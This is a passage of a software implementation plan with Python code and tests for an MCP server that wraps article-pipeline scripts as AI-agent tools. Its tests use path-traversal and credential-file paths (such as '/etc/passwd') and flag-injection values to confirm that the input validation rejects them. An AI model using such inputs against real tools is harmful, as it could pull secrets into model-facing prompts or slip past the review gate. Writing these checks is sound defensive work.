
    Both values may be None (slug not yet upserted / not queued). A corrupt or
    unreadable queue.json is surfaced via 'queue_error' — never hidden.
    """
    result: dict = {"article": get_article(slug), "queue_stage": None}
    if QUEUE_JSON.exists():
        try:
            queue = json.loads(QUEUE_JSON.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError) as exc:
            result["queue_error"] = f"queue.json unreadable: {exc}"
            return result
        for stage, items in queue.items():
            if isinstance(items, list) and any(
                isinstance(item, dict) and item.get("slug") == slug for item in items
            ):
                result["queue_stage"] = stage
                break
    return result
```

Create `factory-mcp/src/factory_mcp/verbs.py`:

```python
"""Sync verb handlers: typed-input validation -> exact argv -> result envelope.

Every handler is synchronous (subprocess work); server.py bridges them onto the
event loop with anyio.to_thread.run_sync. Collaborators are referenced as module
attributes (runner.run_script / state.read_resulting_state) so tests can
monkeypatch them — do not convert to from-imports.
"""
from __future__ import annotations

import re
from typing import Any

from factory_mcp import runner, state

# Per-verb subprocess deadlines (seconds). Draft/images shell out to slow model
# APIs / the Claude CLI; assemble/review/publish(dry-run) are local + fast.
DRAFT_TIMEOUT_S    = 2400
IMAGES_TIMEOUT_S   = 2400
ASSEMBLE_TIMEOUT_S = 300
REVIEW_TIMEOUT_S   = 300
PUBLISH_TIMEOUT_S  = 900

# Mirrors db.export_queue_json()'s stage buckets (db.py:720-723) PLUS
# "scheduled" (written by tpi_publisher.py §12a but absent from the export
# list). THREE copies exist: here, db.export_queue_json, and the
# factory_status schema enum in server.py — keep them in sync.
_STAGES = ["pending_topics", "in_progress", "awaiting_approval",
           "approved", "scheduled", "rejected", "cancelled", "published"]


# ── Validation helpers ─────────────────────────────────────────────────────────

_SLUG_RE = re.compile(r"[a-z0-9][a-z0-9-]{0,80}")


def _no_dash(value: str, key: str) -> str:
    if value.startswith("-"):
        raise ValueError(
            f"`{key}` must not begin with '-' (got {value!r}) — "
            "flag-like values are rejected."
        )
    return value


def _required_str(arguments: dict, key: str) -> str:
    value = arguments.get(key)
    if not isinstance(value, str) or not value.strip():
        raise ValueError(f"`{key}` is required and must be a non-empty string.")
    return _no_dash(value.strip(), key)


def _optional_str(arguments: dict, key: str) -> str | None:
    value = arguments.get(key)
    if value is None:
        return None
    if not isinstance(value, str) or not value.strip():
        raise ValueError(f"`{key}` must be a non-empty string when provided.")
    return _no_dash(value.strip(), key)


def _valid_slug(value: str) -> str:
    """Charset-validate a slug (every verb). Slug is a filesystem path component
    for every wrapped script AND is interpolated into returned text, so shape
    matters beyond flag-injection: no spaces, dots, slashes, shell metachars."""
    if not _SLUG_RE.fullmatch(value):
        raise ValueError(
            f"`slug` must match [a-z0-9][a-z0-9-]{{0,80}} — lowercase letters, "
            f"digits, hyphens only (got {value!r})."
        )
    return value


def _slug(arguments: dict) -> str:
    """Required, charset-validated slug — the ONLY way action verbs read slug."""
    return _valid_slug(_required_str(arguments, "slug"))


def _reject_unknown_keys(arguments: dict, allowed: set[str]) -> None:
    """Fail loudly on typo'd/unknown keys (e.g. `schdule`, `approve`) instead of
    silently dropping the caller's intent into a clean-looking ok:true."""
    unknown = sorted(set(arguments) - allowed)
    if unknown:
        raise ValueError(
            f"unknown argument key(s) {unknown} — allowed keys: {sorted(allowed)}."
        )


# ── Envelope ──────────────────────────────────────────────────────────────────

def _envelope(verb: str, slug: str, run: dict) -> dict:
    """Frozen action-verb result contract (see plan Global Constraints)."""
    return {
        "ok": (run["exit_code"] == 0) and not run["timed_out"],
        "verb": verb,
        "slug": slug,
        "exit_code": run["exit_code"],
        "timed_out": run["timed_out"],
        "duration_s": run["duration_s"],
        "cmd": run["cmd"],
        "stdout_tail": runner.tail(run["stdout"]),
        "stderr_tail": runner.tail(run["stderr"]),
        "resulting_state": state.read_resulting_state(slug),
    }


# ── factory_status ────────────────────────────────────────────────────────────

def status(arguments: dict[str, Any]) -> dict:
    """Read-only view of the articles table (SQLite source of truth, spec §3.2)."""
    _reject_unknown_keys(arguments, {"slug", "stage", "site", "limit"})
    slug  = _optional_str(arguments, "slug")
    if slug is not None:
        slug = _valid_slug(slug)
    stage = _optional_str(arguments, "stage")
    site  = _optional_str(arguments, "site")
    limit = arguments.get("limit", 20)
    if not isinstance(limit, int) or isinstance(limit, bool) or not (1 <= limit <= 200):
        raise ValueError("`limit` must be an integer between 1 and 200.")
    if stage is not None and stage not in _STAGES:
        raise ValueError(f"`stage` must be one of {_STAGES}.")

    if slug:
        row = state.get_article(slug)
        articles = [row] if row else []
        total = len(articles)
    else:
        all_rows = state.get_articles(stage=stage, site=site)
        total = len(all_rows)
        articles = all_rows[:limit]

    result = {
        "ok": True,
        "verb": "status",
        "slug": slug,
        "filters": {"stage": stage, "site": site},
        "total": total,
        "returned": len(articles),
        "articles": articles,
    }
    if slug and not articles:
        result["hint"] = (
            "slug not found in the articles table — check the spelling, or call "
            "factory_status without `slug` to list recent articles"
        )
    return result
```

- [ ] **Step 4: Wire the dispatch + `factory_status` Tool into `server.py`**

Four edits to `factory-mcp/src/factory_mcp/server.py`:

(a) Below the existing mcp imports (after `from mcp.server import Server`), add:

```python
import anyio

from factory_mcp import verbs
```

(b) Immediately after the `server = Server("factory-mcp")` line, add:

```python
# Verb dispatch — Tasks 3-7 each add one entry. Handlers are sync; call_tool
# bridges them off the event loop via anyio.to_thread.
_FACTORY_VERBS = {
    "factory_status": verbs.status,
}
```

(c) In `list_tools()`, insert immediately before the closing `]` of the returned list (after the `list_queue` Tool):

```python
        types.Tool(
            name="factory_status",
            description=(
                "Read Article Factory pipeline state from the SQLite source of truth "
                "(state/jarvis.db `articles` table — NOT the derived queue.json). "
                "Pass `slug` for one article, or filter with `stage`/`site`. Rows are "
                "full articles-table rows (21 columns: slug, site, title, stage, "
                "word_count, primary_keyword, content_path, html_path, wp_post_id, "
                "published_url, published_at, scheduled_for, qa_status, qa_notes, "
                "draft_cost, image_cost, notes, batch ids, created_at, updated_at). "
                "Call after any factory_* action to confirm resulting state."
            ),
            inputSchema={
                "type": "object",
                "additionalProperties": False,
                "properties": {
                    "slug": {
                        "type": "string",
                        "pattern": "^[a-z0-9][a-z0-9-]{0,80}$",
                        "description": "Exact article slug. Omit to list articles instead."
                    },
                    "stage": {
                        "type": "string",
                        "enum": ["pending_topics", "in_progress", "awaiting_approval",
                                 "approved", "scheduled", "rejected", "cancelled",
                                 "published"],
                        "description": "Filter by pipeline stage (ignored when slug is set)."
                    },
                    "site": {
                        "type": "string",
                        "description": "Filter by site as stored in the DB. Both dir-name "
                                       "and domain forms genuinely occur (e.g. "
                                       "'travelplaninfo' AND 'travelplaninfo.com', "
                                       "'travelsfy.com', 'airportspickup.com') — "
                                       "ignored when slug is set."
                    },
                    "limit": {
                        "type": "integer", "minimum": 1, "maximum": 200, "default": 20,
                        "description": "Max rows returned when listing (newest first)."
                    },
                },
            },
        ),
```

(d) In `call_tool()`, insert immediately before the final `return [types.TextContent(type="text", text=json.dumps({"error": "unknown_tool", ...` line:

```python
    elif name in _FACTORY_VERBS:
        result = await anyio.to_thread.run_sync(_FACTORY_VERBS[name], arguments or {})
        return [types.TextContent(
            type="text",
            text=json.dumps(result, ensure_ascii=False, default=str),
        )]
```

(Raised `ValueError`s propagate out of `run_sync`; the MCP SDK converts handler exceptions into `isError` tool results carrying the message — actionable errors, never swallowed.)

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest && .venv/bin/python -c "import factory_mcp.server as s; print(sorted(s._FACTORY_VERBS))"`
Expected: `15 passed` and `['factory_status']`.

- [ ] **Step 6: Commit**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project
git add factory-mcp/src/factory_mcp/state.py factory-mcp/src/factory_mcp/verbs.py \
        factory-mcp/src/factory_mcp/server.py factory-mcp/tests/test_state.py \
        factory-mcp/tests/test_status.py
git commit -m "feat(factory-mcp): factory_status tool reading SQLite source of truth + verb dispatch"
```

---

### Task 3: `factory_draft` — wrap sonnet_writer.py

**Files:**
- Modify: `factory-mcp/src/factory_mcp/verbs.py` (append)
- Modify: `factory-mcp/src/factory_mcp/server.py` (one Tool + one dispatch entry)
- Create: `factory-mcp/tests/test_draft.py`

**Interfaces:**
- Consumes: `runner.run_script`, `verbs._required_str/_optional_str/_no_dash/_envelope`, `DRAFT_TIMEOUT_S` (Tasks 1-2); fixtures `fake_runner`, `canned_state` (Task 1).
- Produces: `verbs.draft(arguments: dict) -> dict` (standard envelope, `verb: "draft"`).
- Backing CLI (verified 2026-07-07): `sonnet_writer.py --site S --slug X [--brief PATH] [--keywords K1 K2 ...] [--words N] [--batch]`. `--brief` takes a FILE PATH; `--keywords` is `nargs="+"`; `--batch` is deliberately never exposed (the synchronous CLI/$0 Max-plan path is the standing default per `feedback_batch_api_mandatory`). On success the script writes the draft JSON and upserts the DB row with `stage="in_progress"` + regenerates queue.json.
- **`brief_path` confinement (review M5):** the script `json.loads(Path(args.brief).read_text())`s whatever it is given and feeds fields into the draft prompt — an unconstrained absolute path would let a caller feed ANY readable JSON on disk (e.g. `~/.openclaw/credentials/*.json`) into a model-facing reader. `brief_path` must `Path.resolve()` under `paths.BASE_DIR` or `~/seo-workspace`; anything else raises `ValueError` before any subprocess.

- [ ] **Step 1: Write the failing test**

Create `factory-mcp/tests/test_draft.py`:

```python
import pytest

from factory_mcp import verbs


def test_draft_full_arg_mapping(fake_runner, canned_state):
    brief = "/home/jarvis/seo-workspace/briefs/miami.json"  # inside the M5 allowlist
    out = verbs.draft({
        "slug": "miami-airport-transfers-2026",
        "site": "airportspickup",
        "brief_path": brief,
        "keywords": ["miami airport car service", "MIA transfers"],
        "words": 1500,
    })
    assert fake_runner.calls == [{
        "script": "sonnet_writer.py",
        "args": ["--site", "airportspickup", "--slug", "miami-airport-transfers-2026",
                 "--brief", brief,
                 "--keywords", "miami airport car service", "MIA transfers",
                 "--words", "1500"],
        "timeout_s": verbs.DRAFT_TIMEOUT_S,
    }]
    assert out["ok"] is True and out["verb"] == "draft"
    assert out["slug"] == "miami-airport-transfers-2026"
    assert out["resulting_state"] == canned_state
    assert set(out) == {"ok", "verb", "slug", "exit_code", "timed_out", "duration_s",
                        "cmd", "stdout_tail", "stderr_tail", "resulting_state"}


def test_draft_minimal_defaults(fake_runner, canned_state):
    verbs.draft({"slug": "some-slug"})
    assert fake_runner.calls[0]["args"] == ["--site", "travelplaninfo", "--slug", "some-slug"]


def test_draft_failure_surfaces_stderr_and_state(fake_runner, canned_state):
    fake_runner.result.update(exit_code=1, stderr="claude CLI exploded\ntrace line")
    out = verbs.draft({"slug": "some-slug"})
    assert out["ok"] is False and out["exit_code"] == 1
    assert "claude CLI exploded" in out["stderr_tail"]
    assert out["resulting_state"] == canned_state  # state re-read even on failure


def test_draft_requires_slug(fake_runner):
    with pytest.raises(ValueError, match="slug"):
        verbs.draft({})
    assert fake_runner.calls == []


def test_draft_rejects_flag_like_slug(fake_runner):
    with pytest.raises(ValueError, match="must not begin with '-'"):
        verbs.draft({"slug": "--approve"})
    assert fake_runner.calls == []


def test_draft_rejects_bad_keywords(fake_runner):
    with pytest.raises(ValueError, match="keywords"):
        verbs.draft({"slug": "s", "keywords": "not-a-list"})
    with pytest.raises(ValueError, match="keywords"):
        verbs.draft({"slug": "s", "keywords": [""]})
    with pytest.raises(ValueError, match="must not begin with '-'"):
        verbs.draft({"slug": "s", "keywords": ["ok", "--batch"]})
    assert fake_runner.calls == []


def test_draft_never_emits_batch_flag(fake_runner, canned_state):
    out = verbs.draft({"slug": "s", "keywords": ["a"], "words": 900})
    assert "--batch" not in out["cmd"] and "--batch" not in fake_runner.calls[0]["args"]


def test_draft_rejects_unknown_keys(fake_runner):
    with pytest.raises(ValueError, match="brief"):
        verbs.draft({"slug": "s", "brief": "/tmp/brief.json"})  # typo for brief_path
    assert fake_runner.calls == []


def test_draft_rejects_brief_path_outside_allowlist(fake_runner):
    """M5: brief_path is fed to a model-facing JSON reader — confine it."""
    for bad in ("/home/jarvis/.openclaw/credentials/openai.json",
                "/etc/passwd",
                "/home/jarvis/seo-workspace/../.openclaw/credentials/openai.json"):
        with pytest.raises(ValueError, match="brief_path"):
            verbs.draft({"slug": "s", "brief_path": bad})
    assert fake_runner.calls == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest tests/test_draft.py`
Expected: FAIL — `AttributeError: module 'factory_mcp.verbs' has no attribute 'draft'`.

- [ ] **Step 3: Implement `verbs.draft`**

First add two imports at the TOP of `factory-mcp/src/factory_mcp/verbs.py`, alongside the existing imports (keep `paths` a module reference — monkeypatch seam style):

```python
from pathlib import Path

from factory_mcp import paths
```

Then append to `factory-mcp/src/factory_mcp/verbs.py`:

```python
# ── factory_draft ─────────────────────────────────────────────────────────────

def _confined_brief_path(value: str) -> str:
    """M5: brief_path feeds a model-facing JSON reader (sonnet_writer read_text's
    it into the draft prompt). Confine it to the project tree or ~/seo-workspace
    so credentials/arbitrary files can never be pulled in."""
    resolved = Path(value).resolve()
    allowed = (paths.BASE_DIR.resolve(), (Path.home() / "seo-workspace").resolve())
    if not any(resolved.is_relative_to(base) for base in allowed):
        raise ValueError(
            f"`brief_path` must resolve under {allowed[0]} or {allowed[1]} "
            f"(got {value!r})."
        )
    return value


def draft(arguments: dict[str, Any]) -> dict:
    """Wrap sonnet_writer.py — draft + humanize an article ($0 Claude CLI path).

    Never passes --batch: the synchronous Max-plan path is the standing default.
    """
    _reject_unknown_keys(arguments, {"slug", "site", "brief_path", "keywords", "words"})
    slug = _slug(arguments)
    site = _optional_str(arguments, "site") or "travelplaninfo"
    brief_path = _optional_str(arguments, "brief_path")
    if brief_path:
        brief_path = _confined_brief_path(brief_path)
    keywords = arguments.get("keywords")
    words = arguments.get("words")

    args = ["--site", site, "--slug", slug]
    if brief_path:
        args += ["--brief", brief_path]
    if keywords is not None:
        if (not isinstance(keywords, list) or not keywords
                or not all(isinstance(k, str) and k.strip() for k in keywords)):
            raise ValueError("`keywords` must be a non-empty array of non-empty strings.")
        args += ["--keywords", *(_no_dash(k.strip(), "keywords") for k in keywords)]
    if words is not None:
        if not isinstance(words, int) or isinstance(words, bool) or not (300 <= words <= 4000):
            raise ValueError("`words` must be an integer between 300 and 4000.")
        args += ["--words", str(words)]

    run = runner.run_script("sonnet_writer.py", args, timeout_s=DRAFT_TIMEOUT_S)
    return _envelope("draft", slug, run)
```

- [ ] **Step 4: Register the tool in `server.py`**

Add to `_FACTORY_VERBS` (one line, after the `factory_status` entry):

```python
    "factory_draft": verbs.draft,
```

Insert in `list_tools()` immediately before the closing `]` (after the `factory_status` Tool):

```python
        types.Tool(
            name="factory_draft",
            description=(
                "Draft a new article via sonnet_writer.py (Claude Code CLI path — $0 on "
                "the Max plan; includes the mandatory humanizer pass). Writes the draft "
                "JSON to content-pipeline/<site>/<date>/<slug>/content/ and upserts the "
                "article row (stage becomes in_progress). LONG-RUNNING: typically 2-10 "
                "minutes. Returns the standard envelope {ok, verb, slug, exit_code, "
                "timed_out, duration_s, cmd, stdout_tail, stderr_tail, resulting_state}."
            ),
            inputSchema={
                "type": "object",
                "required": ["slug"],
                "additionalProperties": False,
                "properties": {
                    "slug": {
                        "type": "string",
                        "pattern": "^[a-z0-9][a-z0-9-]{0,80}$",
                        "description": "Article slug, e.g. 'miami-airport-transfers-2026' "
                                       "(lowercase letters, digits, hyphens). Becomes the "
                                       "pipeline directory and the URL path."
                    },
                    "site": {
                        "type": "string", "default": "travelplaninfo",
                        "description": "Target site directory name (config/sites.json): "
                                       "travelplaninfo, travelsfy, airportspickup, 123cts, "
                                       "spotoh, igadgedx."
                    },
                    "brief_path": {
                        "type": "string",
                        "description": "Absolute path to an article-brief JSON file "
                                       "(CJ link data). Must resolve under the "
                                       "jarvis-project tree or ~/seo-workspace. "
                                       "Maps to --brief."
                    },
                    "keywords": {
                        "type": "array", "items": {"type": "string"},
                        "description": "Target keywords, e.g. "
                                       "['miami airport car service', 'MIA transfers']."
                    },
                    "words": {
                        "type": "integer", "minimum": 300, "maximum": 4000,
                        "description": "Target word count (script default 1800 when omitted)."
                    },
                },
            },
        ),
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest && .venv/bin/python -c "import factory_mcp.server as s; print(sorted(s._FACTORY_VERBS))"`
Expected: `24 passed` and `['factory_draft', 'factory_status']`.

- [ ] **Step 6: Commit**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project
git add factory-mcp/src/factory_mcp/verbs.py factory-mcp/src/factory_mcp/server.py \
        factory-mcp/tests/test_draft.py
git commit -m "feat(factory-mcp): factory_draft verb wrapping sonnet_writer.py"
```

---

### Task 4: `factory_images` — wrap image_pipeline.py

**Files:**
- Modify: `factory-mcp/src/factory_mcp/verbs.py` (append)
- Modify: `factory-mcp/src/factory_mcp/server.py` (one Tool + one dispatch entry)
- Create: `factory-mcp/tests/test_images.py`

**Interfaces:**
- Consumes: same helpers/fixtures as Task 3; `IMAGES_TIMEOUT_S`.
- Produces: `verbs.images(arguments: dict) -> dict` (standard envelope, `verb: "images"`).
- Backing CLI (verified): `image_pipeline.py --provider {openai,xai,openrouter} [--slug X] [--all] [--stage {a,b,all}] [--slot ID] [--reason TXT] [--dry-run]`. `--provider` is REQUIRED by the script — the MCP applies the spec's `openai` default. `--slot` forces stage b inside the script. `--all` (batch over the queue) is out of scope and never emitted.

- [ ] **Step 1: Write the failing test**

Create `factory-mcp/tests/test_images.py`:

```python
import pytest

from factory_mcp import verbs


def test_images_defaults_provider_openai(fake_runner, canned_state):
    out = verbs.images({"slug": "some-slug"})
    assert fake_runner.calls == [{
        "script": "image_pipeline.py",
        "args": ["--provider", "openai", "--slug", "some-slug"],
        "timeout_s": verbs.IMAGES_TIMEOUT_S,
    }]
    assert out["verb"] == "images" and out["ok"] is True


def test_images_full_mapping(fake_runner, canned_state):
    verbs.images({"slug": "s", "provider": "xai", "stage": "b",
                  "slot": "img_02_h2_pricing", "reason": "car parked on sidewalk",
                  "dry_run": True})
    assert fake_runner.calls[0]["args"] == [
        "--provider", "xai", "--slug", "s", "--stage", "b",
        "--slot", "img_02_h2_pricing", "--reason", "car parked on sidewalk",
        "--dry-run",
    ]


def test_images_rejects_unknown_provider(fake_runner):
    with pytest.raises(ValueError, match="provider"):
        verbs.images({"slug": "s", "provider": "midjourney"})
    assert fake_runner.calls == []


def test_images_rejects_reason_without_slot(fake_runner):
    with pytest.raises(ValueError, match="reason"):
        verbs.images({"slug": "s", "reason": "blurry"})
    assert fake_runner.calls == []


def test_images_never_emits_all_flag(fake_runner, canned_state):
    out = verbs.images({"slug": "s", "dry_run": True})
    assert "--all" not in out["cmd"]


def test_images_rejects_unknown_keys(fake_runner):
    with pytest.raises(ValueError, match="dryrun"):
        verbs.images({"slug": "s", "dryrun": True})  # typo must not silently spend money
    assert fake_runner.calls == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest tests/test_images.py`
Expected: FAIL — `AttributeError: module 'factory_mcp.verbs' has no attribute 'images'`.

- [ ] **Step 3: Implement `verbs.images`**

Append to `factory-mcp/src/factory_mcp/verbs.py`:

```python
# ── factory_images ────────────────────────────────────────────────────────────

def images(arguments: dict[str, Any]) -> dict:
    """Wrap image_pipeline.py — Stage A prompt refinement / Stage B generation.

    dry_run previews the queue with zero API calls. Real runs cost money
    (paid image API) — never batch (--all) from the MCP.
    """
    _reject_unknown_keys(arguments,
                         {"slug", "provider", "stage", "slot", "reason", "dry_run"})
    slug = _slug(arguments)
    provider = _optional_str(arguments, "provider") or "openai"
    if provider not in ("openai", "xai", "openrouter"):
        raise ValueError("`provider` must be one of: openai, xai, openrouter.")
    stage = _optional_str(arguments, "stage")
    if stage is not None and stage not in ("a", "b", "all"):
        raise ValueError("`stage` must be one of: a, b, all.")
    slot = _optional_str(arguments, "slot")
    reason = _optional_str(arguments, "reason")
    if reason and not slot:
        raise ValueError("`reason` is only used when regenerating a single `slot` — "
                         "pass slot (e.g. 'img_02_h2_pricing') or drop reason.")
    dry_run = bool(arguments.get("dry_run", False))

    args = ["--provider", provider, "--slug", slug]
    if stage:
        args += ["--stage", stage]
    if slot:
        args += ["--slot", slot]
    if reason:
        args += ["--reason", reason]
    if dry_run:
        args += ["--dry-run"]

    run = runner.run_script("image_pipeline.py", args, timeout_s=IMAGES_TIMEOUT_S)
    return _envelope("images", slug, run)
```

- [ ] **Step 4: Register the tool in `server.py`**

Add to `_FACTORY_VERBS`:

```python
    "factory_images": verbs.images,
```

Insert in `list_tools()` before the closing `]`:

```python
        types.Tool(
            name="factory_images",
            description=(
                "Run the provider-switchable image pipeline (image_pipeline.py) for one "
                "article. stage 'a' refines prompts, 'b' generates images, 'all' does "
                "both (script default). Pass slot (e.g. 'img_02_h2_pricing') + reason to "
                "regenerate a single image. dry_run=true previews the image queue with "
                "ZERO API calls; real runs spend money (paid image API) — confirm with "
                "Jose per the cost rules before non-dry runs. Returns the standard "
                "envelope."
            ),
            inputSchema={
                "type": "object",
                "required": ["slug"],
                "additionalProperties": False,
                "properties": {
                    "slug": {"type": "string",
                             "pattern": "^[a-z0-9][a-z0-9-]{0,80}$",
                             "description": "Article slug."},
                    "provider": {
                        "type": "string", "enum": ["openai", "xai", "openrouter"],
                        "default": "openai",
                        "description": "Image provider (default openai)."
                    },
                    "stage": {
                        "type": "string", "enum": ["a", "b", "all"],
                        "description": "a = refine prompts only, b = generate only, "
                                       "all = both (script default when omitted)."
                    },
                    "slot": {
                        "type": "string",
                        "description": "Regenerate one image slot by custom_id, e.g. "
                                       "'img_02_h2_pricing'. Forces stage b."
                    },
                    "reason": {
                        "type": "string",
                        "description": "Why the slot is regenerated — injected into the "
                                       "image prompt. Only valid together with slot."
                    },
                    "dry_run": {
                        "type": "boolean", "default": False,
                        "description": "Preview the queue without any API calls (no cost)."
                    },
                },
            },
        ),
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest`
Expected: `30 passed`.

- [ ] **Step 6: Commit**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project
git add factory-mcp/src/factory_mcp/verbs.py factory-mcp/src/factory_mcp/server.py \
        factory-mcp/tests/test_images.py
git commit -m "feat(factory-mcp): factory_images verb wrapping image_pipeline.py"
```

---

### Task 5: `factory_assemble` — wrap content_assembler.py

**Files:**
- Modify: `factory-mcp/src/factory_mcp/verbs.py` (append)
- Modify: `factory-mcp/src/factory_mcp/server.py` (one Tool + one dispatch entry)
- Create: `factory-mcp/tests/test_assemble.py`

**Interfaces:**
- Consumes: same helpers/fixtures; `ASSEMBLE_TIMEOUT_S`.
- Produces: `verbs.assemble(arguments: dict) -> dict` (standard envelope, `verb: "assemble"`).
- Backing CLI (verified): `content_assembler.py --slug X [--dry-run]`. Exits 1 with `ERROR: No draft JSON found for slug '<slug>'` on stderr when the draft is missing.

- [ ] **Step 1: Write the failing test**

Create `factory-mcp/tests/test_assemble.py`:

```python
import pytest

from factory_mcp import verbs


def test_assemble_arg_mapping(fake_runner, canned_state):
    out = verbs.assemble({"slug": "some-slug"})
    assert fake_runner.calls == [{
        "script": "content_assembler.py",
        "args": ["--slug", "some-slug"],
        "timeout_s": verbs.ASSEMBLE_TIMEOUT_S,
    }]
    assert out["verb"] == "assemble" and out["ok"] is True


def test_assemble_dry_run_flag(fake_runner, canned_state):
    verbs.assemble({"slug": "some-slug", "dry_run": True})
    assert fake_runner.calls[0]["args"] == ["--slug", "some-slug", "--dry-run"]


def test_assemble_missing_draft_failure_surfaced(fake_runner, canned_state):
    fake_runner.result.update(
        exit_code=1, stderr="ERROR: No draft JSON found for slug 'ghost'")
    out = verbs.assemble({"slug": "ghost"})
    assert out["ok"] is False and out["exit_code"] == 1
    assert "No draft JSON found" in out["stderr_tail"]


def test_assemble_rejects_unknown_keys(fake_runner):
    with pytest.raises(ValueError, match="dry-run"):
        verbs.assemble({"slug": "s", "dry-run": True})  # hyphen typo for dry_run
    assert fake_runner.calls == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest tests/test_assemble.py`
Expected: FAIL — `AttributeError: module 'factory_mcp.verbs' has no attribute 'assemble'`.

- [ ] **Step 3: Implement `verbs.assemble`**

Append to `factory-mcp/src/factory_mcp/verbs.py`:

```python
# ── factory_assemble ──────────────────────────────────────────────────────────

def assemble(arguments: dict[str, Any]) -> dict:
    """Wrap content_assembler.py — build Gutenberg HTML from draft sections."""
    _reject_unknown_keys(arguments, {"slug", "dry_run"})
    slug = _slug(arguments)
    args = ["--slug", slug]
    if bool(arguments.get("dry_run", False)):
        args += ["--dry-run"]
    run = runner.run_script("content_assembler.py", args, timeout_s=ASSEMBLE_TIMEOUT_S)
    return _envelope("assemble", slug, run)
```

- [ ] **Step 4: Register the tool in `server.py`**

Add to `_FACTORY_VERBS`:

```python
    "factory_assemble": verbs.assemble,
```

Insert in `list_tools()` before the closing `]`:

```python
        types.Tool(
            name="factory_assemble",
            description=(
                "Assemble the article's Gutenberg HTML from its draft sections "
                "(content_assembler.py) — inserts available images and affiliate CTAs. "
                "Run after factory_draft (and factory_images if images are wanted). "
                "dry_run previews without writing files. Fails loudly (ok=false, "
                "stderr_tail) when no draft JSON exists for the slug. Returns the "
                "standard envelope."
            ),
            inputSchema={
                "type": "object",
                "required": ["slug"],
                "additionalProperties": False,
                "properties": {
                    "slug": {"type": "string",
                             "pattern": "^[a-z0-9][a-z0-9-]{0,80}$",
                             "description": "Article slug."},
                    "dry_run": {
                        "type": "boolean", "default": False,
                        "description": "Preview without writing files."
                    },
                },
            },
        ),
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest`
Expected: `34 passed`.

- [ ] **Step 6: Commit**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project
git add factory-mcp/src/factory_mcp/verbs.py factory-mcp/src/factory_mcp/server.py \
        factory-mcp/tests/test_assemble.py
git commit -m "feat(factory-mcp): factory_assemble verb wrapping content_assembler.py"
```

---

### Task 6: `factory_review` — wrap content_reviewer.py

**Files:**
- Modify: `factory-mcp/src/factory_mcp/verbs.py` (append)
- Modify: `factory-mcp/src/factory_mcp/server.py` (one Tool + one dispatch entry)
- Create: `factory-mcp/tests/test_review.py`

**Interfaces:**
- Consumes: same helpers/fixtures; `REVIEW_TIMEOUT_S`.
- Produces: `verbs.review(arguments: dict) -> dict` — standard envelope PLUS `"review_passed": bool` (equals `ok`).
- Backing CLI (verified): `content_reviewer.py --slug X [--site S]` (also has `--audit-all/--audit-published/--dry-run/--fix` — none of which the MCP ever emits). With `--slug`: exit 0 = review passed, exit 1 = review FAILED (issues printed to stdout) or slug not found. **`--fix` is NOT exposed via MCP (review H2):** it writes `review_status: "passed"` directly into the article JSON and exits 0 — a self-green of the mandatory quality gate. That override stays operator-CLI-only; it is on `runner.FORBIDDEN_FLAGS`, absent from the input schema, and rejected as an unknown key if a caller passes `fix`.

- [ ] **Step 1: Write the failing test**

Create `factory-mcp/tests/test_review.py`:

```python
import pytest

from factory_mcp import verbs


def test_review_slug_only_mapping(fake_runner, canned_state):
    out = verbs.review({"slug": "some-slug"})
    assert fake_runner.calls == [{
        "script": "content_reviewer.py",
        "args": ["--slug", "some-slug"],
        "timeout_s": verbs.REVIEW_TIMEOUT_S,
    }]
    assert out["verb"] == "review"
    assert out["ok"] is True and out["review_passed"] is True


def test_review_site_mapping(fake_runner, canned_state):
    verbs.review({"slug": "s", "site": "travelsfy"})
    assert fake_runner.calls[0]["args"] == ["--slug", "s", "--site", "travelsfy"]


def test_review_failed_review_sets_flags(fake_runner, canned_state):
    fake_runner.result.update(
        exit_code=1, stdout="FAILED: thin content (412 words < 800)")
    out = verbs.review({"slug": "s"})
    assert out["ok"] is False and out["review_passed"] is False
    assert "thin content" in out["stdout_tail"]


def test_review_never_emits_audit_or_fix_flags(fake_runner, canned_state):
    out = verbs.review({"slug": "s", "site": "travelsfy"})
    for forbidden in ("--audit-all", "--audit-published", "--dry-run", "--fix"):
        assert forbidden not in out["cmd"]


def test_review_rejects_fix_key(fake_runner):
    # H2: the self-green override is operator-CLI-only — `fix` is not even a
    # recognized argument; it must 400, never silently no-op or pass --fix.
    with pytest.raises(ValueError, match="fix"):
        verbs.review({"slug": "s", "fix": True})
    assert fake_runner.calls == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest tests/test_review.py`
Expected: FAIL — `AttributeError: module 'factory_mcp.verbs' has no attribute 'review'`.

- [ ] **Step 3: Implement `verbs.review`**

Append to `factory-mcp/src/factory_mcp/verbs.py`:

```python
# ── factory_review ────────────────────────────────────────────────────────────

def review(arguments: dict[str, Any]) -> dict:
    """Wrap content_reviewer.py — the mandatory content quality gate.

    Exit 0 = passed; exit 1 = review FAILED (issues in stdout_tail) or slug not
    found — read stdout_tail to distinguish. The script's --fix self-green
    override is operator-CLI-only and deliberately NOT exposed here (review H2).
    """
    _reject_unknown_keys(arguments, {"slug", "site"})
    slug = _slug(arguments)
    site = _optional_str(arguments, "site")

    args = ["--slug", slug]
    if site:
        args += ["--site", site]

    run = runner.run_script("content_reviewer.py", args, timeout_s=REVIEW_TIMEOUT_S)
    env = _envelope("review", slug, run)
    env["review_passed"] = env["ok"]
